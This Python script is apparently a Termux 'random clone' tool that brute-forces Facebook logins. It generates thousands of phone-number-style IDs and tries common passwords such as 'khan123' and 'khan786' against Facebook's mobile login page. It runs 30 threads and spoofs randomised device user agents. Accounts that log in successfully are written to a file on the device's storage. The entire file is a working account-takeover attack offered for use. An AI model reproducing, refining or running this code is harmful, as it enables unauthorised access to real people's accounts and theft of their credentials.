#coding=utf-8
#!/usr/bin/python3
'''script writes by Javed Iqbal Sad Boy[BXB]'''
import os,sys,random,requests,string
import requests,os,re,bs4,sys,uuid,json
import time,random,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup
os.system("pip install requests")
os.system("pip install bs4")
os.system("pip install futures")
remover = '\x1b[1;0m'
green = '\x1b[1;92m'
orange = '\x1b[38;5;208m'
os.system ("clear")
lin = "------------------------------------"
uid,oks,cps = [],[],[]
loop = 0
try: 
    os.mkdir('/sdcard/bxb_data') 
except:
    pass 
'''try:
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
	open('http.txt','w').write(prox)
except Exception as e:
	os.system ("clear")
prox=open('http.txt','r').read().splitlines()'''
models =["SM-T535|LRX22G","SM-T231|KOT49H","SM-J320F|LMY47V","GT-I9190|KOT49H","GT-N7100|KOT49H","SM-T561|KTU84P","GT-N7100|KOT49H","GT-I9500|LRX22C","SM-J320F|LMY47V","SM-G930F|NRD90M","SM-J320F|LMY47V","SM-J510FN|NMF26X","GT-P5100|IML74K","SM-J320F|LMY47V","SM-T531|LRX22G","SPH-L720|KOT49H","GT-I9500|JDQ39"]
model_,build = random.choice(models).rsplit('|')
fbsv = f"{random.uniform(4.0, 10.0):.1f}"
android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
fban = random.choice(["FB4A", "FB5A", "FB6A"])
facebook_version = f"{random.randint(100, 200)}.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
fbbv = str(random.randint(10000000, 99999999))
density = random.uniform(1.0, 4.0)
width = random.randint(720, 1440)
height = random.randint(1280, 2560)
fbrv = str(random.randint(10000000, 99999999))
fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
fbbd = 'Samsung'
network_carriers = ["Verizon", "AT&T", "T-Mobile", "Sprint"]
network_carrier = random.choice(network_carriers)
network_type = random.choice(["WiFi", "4G", "3G"])
ip_address = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
user_agent = f"Dalvik/1.6.0 (Linux; U; {android_version}; {model_} Build/{build}) " \
f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density:.1f},width={width},height={height}}};FBLC/it_IT;FBRV/{fbrv};FBCR/{fbcr};FBMF/{model_};FBBD/{fbbd};FBPN/{fbpn};FBDV/{model_.replace(' ', '_')};FBSV/{fbsv};FBOP/1;FBCA/x86:armeabi-v7a;FBNT/{network_type};FBCN/{network_carrier};FBSR/{ip_address};]"
uzzx = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
usera = "Mozilla/5.0 (Windows Phone 8.1; FBBV/ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko"
userb = "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
userc = "Nokia5250/10.0.011 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba"
userd = '[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.orca;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Telenor;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.orca;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.orca;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.orca;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.orca;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
userm = random.choice(userd)
userx = user_agent,usera,userb,userc,userm
user_all = random.choice(userx)
logo="""
\033[1;97m#########   ##         ## #########
\033[1;97m##        ## ##       ## ##        ##
\033[1;97m##        ##  ##     ##  ##        ##
\033[1;97m##        ##   ##   ##   ##        ##
\033[1;97m##########      ## ##    ##########
\033[1;97m##        ##    # ##     ##        ##
\033[1;97m##        ##   ##   ##   ##        ##
\033[1;97m##        ##  ##     ##  ##        ##
\033[1;97m##########  ##         ## #########
------------------------------------
[\033[1;92m◉\033[1;97m] Author   : Javed Iqbal sad boy
[\033[1;92m◉\033[1;97m] Facebook : Javed Iqbal sad boy
[\033[1;92m◉\033[1;97m] Fb group : Termux Command (BXB)
[\033[1;92m◉\033[1;97m] Version  : 0.4.7
------------------------------------"""
def main():
	os.system("xdg-open https://facebook.com/groups/347577560720737/")
	print(logo)
	print(lin)
	print("(1) clone random")
	print("(2) contact admin")
	print("(0) exit program")
	print(lin)
	bxb_a = input(f"({green}◉{remover}) select: ")
	if bxb_a in ["1","01"]: bxb_mx()
	elif bxb_a in ["2","02"]: os.system("xdg-open https://www.facebook.com/profile.php?id=100010405483021")
	elif bxb_a in ["0","00"]: sys.exit(f"({green}◉{remover}) good bye")
	else:
		print("({green}◉{remover}) please put valid option")
		os.system("python BXB.py")
def bxb_mx():
	userid=[]
	os.system('clear')
	print(logo)
	print(lin)
	print(f" ({green}◉{remover}) for example 0300 or 92300")
	print(lin)
	bxb_b = input(f" ({green}◉{remover}) select: ")
	os.system('clear')
	print(logo)
	print(lin)
	print(f" ({green}◉{remover}) put ids limit example 2000,5000")
	print(lin)
	bxb_limit = int(input(f" ({green}◉{remover}) select: "))
	for bxb_n in range(bxb_limit):
		sad_boy = ''.join(random.choice(string.digits) for _ in range(7))
		userid.append(sad_boy)
	with ThreadPool(max_workers=30) as bxb_xd:
		os.system('clear')
		print(logo)
		print(f"  ({green}◉{remover}) for only pro clonners")
		print(lin)
		print(f'({green}◉{remover}) process started...')
		print(f'({green}◉{remover}) please wait...')
		print(lin)
		for sad in userid:
			userid = bxb_b+sad
			bxb_sad = [sad,bxb_b+sad,"khan123","khan1234","khan khan","khankhan","khan786","khan1122"]
			bxb_xd.submit(sad_random,userid,bxb_sad)
	print(f" ({green}◉{remover}) process complete")
	print(f" ({green}◉{remover}) account saved /sdcard/bxb_data")
	input(f" ({green}◉{remover}) press enter: ")
	os.system("python BXB.py")
def sad_random(userid,bxb_sad):
	global loop
	global cps
	global oks
	try:
		for sad_xd in bxb_sad:
			session = requests.Session()
			free_fb = session.get('https://x.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":userid,
			"pass":sad_xd,
			"login":"Log In"}
			header_freefb = {'authority': 'p.facebook.com',
			'method':'GET',
			'path':'/?tbua=1',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'referer': 'https://p.facebook.com/',
			'sec-ch-prefers-color-scheme': 'light',
			'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
			'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.76", "Not(A:Brand";v="8.0.0.0"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': '"10.0.0"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': user_all}
			lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print(f'{green}[BXB-SUCCESSFUL] {userid} | {sad_xd}{remover}')
				open('/sdcard/bxb_data/ok.txt', 'a').write(userid+' | '+sad_xd+'\n')
				oks.append(userid)
				break
			elif 'checkpoint' in log_cookies:
				print(f'{orange}[BXB-CHECKPOINT] {userid} | {sad_xd}{remover}')
				cps.append(userid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f'\r ({green}◉{remover}) {loop} {green}◉ {remover}OK {green}{len(oks)}{remover}\r')
		sys.stdout.flush()
	except:
		pass

if __name__ == "__main__":
	main()